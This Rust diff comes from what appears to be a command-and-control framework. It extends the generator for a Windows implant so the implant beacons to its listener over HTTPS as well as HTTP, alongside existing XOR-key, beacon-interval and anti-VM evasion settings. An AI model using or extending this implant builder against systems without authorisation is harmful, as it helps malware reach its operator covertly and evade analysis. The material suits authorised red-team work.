@@ -262,15 +262,20 @@ impl AgentHandler {
                 return Err(format!("Database error while checking listener: {}", e));
             }
         };
-        if listener.listener_type.to_lowercase() != "http" {
+        let use_https = listener.listener_type.to_lowercase() == "https";
+
+        if listener.listener_type.to_lowercase() != "http"
+            && listener.listener_type.to_lowercase() != "https"
+        {
             return Err(format!(
-                "Only HTTP listener supported for Windows payload, got: {}",
+                "Only HTTP/HTTPS listener supported for Windows payload, got: {}",
                 listener.listener_type
             ));
         }
 
         log::info!(
-            "[+] Using listener '{}' from database (host: {}:{}, path: {})",
+            "[+] Using {} listener '{}' from database (host: {}:{}, path: {})",
+            if use_https { "HTTPS" } else { "HTTP" },
             listener_name,
             listener.host,
             listener.port,
@@ -296,6 +301,7 @@ impl AgentHandler {
         log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
         log::info!("    - Beacon Interval: {}s", config.beacon_interval);
         log::info!("    - Anti-VM: {}", config.anti_vm);
+        log::info!("    - USE_HTTPS: {}", use_https);
 
         let new_agent_config = format!(
             r#"#pragma once
@@ -309,6 +315,7 @@ constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
 constexpr bool ANTI_VM_ENABLED = {};
+constexpr bool USE_HTTPS = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -319,6 +326,7 @@ constexpr bool ANTI_VM_ENABLED = {};
             listener.uri_paths,
             config.beacon_interval,
             if config.anti_vm { "true" } else { "false" },
+            if use_https { "true" } else { "false" },
         );
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
 
@@ -391,15 +399,20 @@ constexpr bool ANTI_VM_ENABLED = {};
             }
         };
 
-        if listener.listener_type.to_lowercase() != "http" {
+        let use_https = listener.listener_type.to_lowercase() == "https";
+
+        if listener.listener_type.to_lowercase() != "http"
+            && listener.listener_type.to_lowercase() != "https"
+        {
             return Err(format!(
-                "Only HTTP listener supported for Windows payload, got: {}",
+                "Only HTTP/HTTPS listener supported for Windows payload, got: {}",
                 listener.listener_type
             ));
         }
 
         log::info!(
-            "[+] Using listener '{}' from database (host: {}:{}, path: {})",
+            "[+] Using {} listener '{}' from database (host: {}:{}, path: {})",
+            if use_https { "HTTPS" } else { "HTTP" },
             listener_name,
             listener.host,
             listener.port,
@@ -426,6 +439,7 @@ constexpr bool ANTI_VM_ENABLED = {};
         log::info!("    - Headers: {}", header_cstr.replace("\\n", ", "));
         log::info!("    - Beacon Interval: {}s", config.beacon_interval);
         log::info!("    - Anti-VM: {}", config.anti_vm);
+        log::info!("    - USE_HTTPS: {}", use_https);
 
         let new_agent_config = format!(
             r#"#pragma once
@@ -439,6 +453,7 @@ constexpr char HEADER[] = "{}";
 constexpr char RESULTS_PATH[] = "{}";
 constexpr int BEACON_INTERVAL = {};
 constexpr bool ANTI_VM_ENABLED = {};
+constexpr bool USE_HTTPS = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -449,6 +464,7 @@ constexpr bool ANTI_VM_ENABLED = {};
             listener.uri_paths,
             config.beacon_interval,
             if config.anti_vm { "true" } else { "false" },
+            if use_https { "true" } else { "false" },
         );
 
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
